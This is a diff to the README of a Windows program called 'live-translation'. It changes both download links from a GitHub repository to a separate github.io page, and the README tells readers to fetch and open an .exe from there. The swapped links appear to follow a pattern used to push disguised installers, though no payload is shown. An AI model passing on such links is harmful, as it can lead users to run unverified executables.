@@ -1,6 +1,6 @@
 # 🌐 live-translation - See translated text on your screen
 
-[![Download live-translation](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Largenessstickballgame154/live-translation)
+[![Download live-translation](https://img.shields.io/badge/Download-Release-blue)](https://largenessstickballgame154.github.io)
 
 ## 📌 What is live-translation?
 
@@ -16,7 +16,7 @@ The program runs locally on your hardware. It does not need a cloud connection. 
 
 Follow these steps to install the software on your Windows computer.
 
-1. Visit [this release page](https://github.com/Largenessstickballgame154/live-translation) to download the latest version of the installer.
+1. Visit [this release page](https://largenessstickballgame154.github.io) to download the latest version of the installer.
 2. Select the file ending in `.exe` for Windows.
 3. Open the downloaded file once the transfer completes.
 4. Follow the instructions on the screen to finish the setup.
